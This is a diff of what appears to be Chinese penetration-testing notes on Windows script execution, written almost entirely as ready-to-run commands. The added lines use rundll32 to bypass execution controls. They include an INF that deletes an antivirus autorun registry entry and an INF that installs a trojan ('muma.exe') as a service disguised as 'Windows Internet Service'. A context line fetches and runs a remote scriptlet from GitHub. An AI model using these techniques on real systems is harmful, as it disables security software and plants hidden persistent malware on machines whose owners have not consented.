@@ -12,6 +12,7 @@ windows script example in penetration
 	cscript.exe vbs_script.vbs
 	vbs_script.vbs
 
+
 #### 3. csc(.cs c#) ####
 
 首先通过`csc.exe`进行编译c#为`exe`，然后通过`InstallUtil.exe`进行程序执行
@@ -48,6 +49,52 @@ HTA（HTML Application)，可以嵌入`JScript`和`VBScript`，后缀名为`.hta
 	rundll32 AllTheThings.dll,EntryPoint 
 
 	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct");o.Exec();window.close();	
+
+通过`system`的一些`dll`可以扩展很多绕过方法：
+
+	rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe
+
+	rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe
+
+	rundll32 url.dll, FileProtocolHandler calc.exe
+
+修改注册表项
+
+reg.inf
+
+    [Version]
+    
+    Signature="$WINDOWS NT$"
+    
+    [DefaultInstall]
+    
+    AddReg=My_AddReg_Name
+    
+    DelReg=My_DelReg_Name
+    
+    [My_DelReg_Name]
+    
+    HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,KAVRun
+
+    rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
+
+添加服务
+
+srv.inf
+
+    [Version]
+    Signature="$WINDOWS NT$"
+    [DefaultInstall.Services]
+    AddService=inetsvr,,My_AddService_Name
+    [My_AddService_Name]
+    DisplayName=Windows Internet Service
+    Description=提供对 Internet 信息服务管理的支持。
+    ServiceType=0x10
+    StartType=2
+    ErrorControl=0
+    ServiceBinary=%11%\muma.exe
+
+	rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/srv.inf
 
 https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings
 
